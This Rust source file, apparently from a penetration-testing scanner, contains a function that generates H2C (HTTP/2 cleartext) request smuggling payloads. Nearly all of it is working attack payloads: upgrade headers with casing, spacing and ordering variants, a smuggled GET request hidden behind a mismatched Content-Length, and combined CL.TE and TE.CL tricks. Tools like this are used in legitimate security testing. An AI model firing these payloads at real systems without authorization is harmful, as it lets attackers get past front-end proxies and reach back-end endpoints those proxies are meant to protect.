use super::{format_cookies, format_custom_headers};

/// Generate H2C (HTTP/2 Cleartext) smuggling attack payloads
/// H2C smuggling exploits discrepancies in how proxies handle HTTP/1.1 to HTTP/2 upgrade requests
/// Reference: https://bishopfox.com/blog/h2c-smuggling-request
pub fn get_h2c_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    // Shared request head (request line, Host, custom headers, cookies). Every
    // payload but the last (which reorders HTTP2-Settings above Host) starts here;
    // `push` appends the upgrade/body tail that distinguishes each one.
    let head =
        format!("{method} {path} HTTP/1.1\r\nHost: {host}\r\n{custom_header_str}{cookie_str}");
    let mut payloads = Vec::with_capacity(16);
    let mut push = |rest: &str| payloads.push(format!("{head}{rest}"));

    // Basic H2C upgrade request
    // The front-end may not process the upgrade, but the back-end might
    push(
        "Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\nContent-Length: 0\r\n\r\n",
    );

    // H2C upgrade with smuggled request (using Content-Length discrepancy)
    push(
        "Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\nContent-Length: 30\r\n\r\n\
         GET /smuggled HTTP/1.1\r\nFoo: x",
    );

    // H2C upgrade with different Connection header variations
    let connection_variations = [
        "Connection: Upgrade, HTTP2-Settings, close",
        "Connection: Upgrade,HTTP2-Settings",
        "Connection: Upgrade, HTTP2-Settings, keep-alive",
        "Connection: HTTP2-Settings, Upgrade",
        "Connection: upgrade, http2-settings", // lowercase
        "Connection: UPGRADE, HTTP2-SETTINGS", // uppercase
    ];
    for conn_header in connection_variations {
        push(&format!(
            "{conn_header}\r\nUpgrade: h2c\r\n\
             HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\nContent-Length: 0\r\n\r\n"
        ));
    }

    // Upgrade header variations
    let upgrade_variations = [
        "Upgrade: h2c",
        "Upgrade: H2C",           // uppercase
        "Upgrade: h2c, http/1.1", // multiple protocols
        "Upgrade: http/1.1, h2c", // reversed order
        " Upgrade: h2c",          // space prefix
        "Upgrade : h2c",          // space before colon
        "Upgrade:\th2c",          // tab after colon
    ];
    for upgrade_header in upgrade_variations {
        push(&format!(
            "Connection: Upgrade, HTTP2-Settings\r\n{upgrade_header}\r\n\
             HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\nContent-Length: 0\r\n\r\n"
        ));
    }

    // HTTP2-Settings header variations (different base64 encoded SETTINGS frames)
    let http2_settings_variations = [
        "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA",  // default
        "HTTP2-Settings: AAQAAP__",                  // minimal settings
        "HTTP2-Settings: AAMAAABkAAQAAP__AAIAAAAA",  // alternate settings
        "http2-settings: AAMAAABkAARAAAAAAAIAAAAA",  // lowercase
        "HTTP2-SETTINGS: AAMAAABkAARAAAAAAAIAAAAA",  // uppercase
        "HTTP2-Settings:AAMAAABkAARAAAAAAAIAAAAA",   // no space
        " HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA", // space prefix
    ];
    for settings_header in http2_settings_variations {
        push(&format!(
            "Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\n\
             {settings_header}\r\nContent-Length: 0\r\n\r\n"
        ));
    }

    // H2C with Transfer-Encoding (combining H2C with CL.TE techniques)
    push(
        "Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\nContent-Length: 6\r\n\
         Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
    );

    // H2C with chunked encoding (combining H2C with TE.CL techniques)
    push(
        "Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\nTransfer-Encoding: chunked\r\n\
         Content-Length: 4\r\n\r\n1\r\nA\r\n0\r\n\r\n",
    );

    // Double upgrade headers (upgrade obfuscation similar to TE.TE)
    push(
        "Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nUpgrade: http/1.1\r\n\
         HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\nContent-Length: 0\r\n\r\n",
    );

    // H2C with different HTTP2-Settings positions (HTTP2-Settings before Host)
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n\
         Host: {host}\r\n{custom_header_str}{cookie_str}\
         Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nContent-Length: 0\r\n\r\n"
    ));

    payloads
}
